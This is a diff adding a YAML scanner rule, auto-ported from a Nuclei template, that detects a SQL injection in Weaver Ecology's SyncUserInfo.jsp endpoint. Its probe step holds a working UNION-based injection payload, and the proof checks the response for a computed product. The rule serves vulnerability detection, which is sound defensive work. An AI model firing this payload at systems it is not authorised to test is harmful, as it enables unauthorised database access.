@@ -1,0 +1,30 @@
+schema_version: 1
+id: "cortex.community:ecology-syncuserinfo-sqli"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Ecology Syncuserinfo - SQL Injection"
+  description: "Ecology Syncuserinfo contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://www.weaver.com.cn/"
+    - "https://github.com/chaitin/xray/blob/master/pocs/ecology-syncuserinfo-sqli.yml"
+  cwes: [89]
+  tags: ["ecology", "sqli", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "Critical"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "4386499557" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
